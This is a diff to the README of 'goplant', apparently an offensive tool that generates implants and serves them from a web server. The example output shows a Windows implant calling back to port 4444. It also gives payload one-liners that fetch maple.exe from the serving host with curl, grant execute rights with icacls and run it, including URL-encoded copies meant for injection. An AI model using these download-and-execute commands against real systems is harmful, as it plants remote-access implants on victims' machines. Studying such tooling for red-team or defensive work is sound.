@@ -44,25 +44,29 @@ The serve command allows you to directly generate an implant and serve it on a w
 Goplant show you some example commands to execute to download and execute your payload
 
 ```bash
-goplant serve --lhost 10.10.15.144 --lport 4444 --arch amd64  --os linux
-   ______      ____  __            __ 
+goplant serve --lhost 10.10.15.144 --lport 4444 --arch amd64  --os windows
+    ______      ____  __            __ 
   / ____/___  / __ \/ /___ _____  / /_
  / / __/ __ \/ /_/ / / __ `/ __ \/ __/
 / /_/ / /_/ / ____/ / /_/ / / / / /_  
 \____/\____/_/   /_/\__,_/_/ /_/\__/
 
-🪴Listen on:   http://0.0.0.0:1337/cactus
+🪴Listen on:   http://0.0.0.0:1337/maple.exe
 
-🪴 Implant : linux/amd64 --> 10.10.15.144:4444
+🪴 Implant : windows/amd64 --> 192.168.0.1:4444
 
 
 🪴 Payloads : 
-curl http://10.10.15.144:1337/cactus -O
-curl http://10.10.15.144:1337/cactus -O && chmod +x cactus && ./cactus
+
+
+🪴 Payloads : 
+curl http://192.168.0.1:1337/maple.exe -O
+curl.exe http://192.168.0.1:1337/maple.exe -O && icacls maple.exe /grant Everyone:RX  && ./maple.exe
+Url encoded : 
+curl+http%3A%2F%2F192.168.0.1%3A1337%2Fmaple.exe+-O%0A
+curl.exe+http%3A%2F%2F192.168.0.1%3A1337%2Fmaple.exe+-O+%26%26+icacls+maple.exe+%2Fgrant+Everyone%3ARX++%26%26+.%2Fmaple.exe%0A
 
 ```
 
 ---
 
-## TODO : 
-- Refaire le logo 
